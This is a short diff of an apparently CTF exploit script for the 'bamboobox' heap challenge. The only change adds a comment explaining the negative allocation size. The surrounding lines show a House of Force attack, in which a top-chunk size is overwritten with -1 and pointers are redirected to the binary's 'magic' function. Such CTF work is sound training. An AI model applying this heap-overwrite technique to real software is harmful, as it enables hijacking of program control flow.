@@ -34,7 +34,7 @@ if __name__ == "__main__":
     add(0x60, cyclic(0x60))
     #  DEBUG()
     change(0, 0x60 + 0x10, cyclic(0x60) + p64(0) + l64(-1))
-    add(-(0x60 + 0x10) - (0x10 + 0x10) - 0x10, 'aaaa')
+    add(-(0x60 + 0x10) - (0x10 + 0x10) - 0x10, 'aaaa') # -sizeof(item) - sizeof(box) - 0x10
     add(0x10, p64(ELF("./bamboobox").sym['magic']) * 2)
     exit()
 
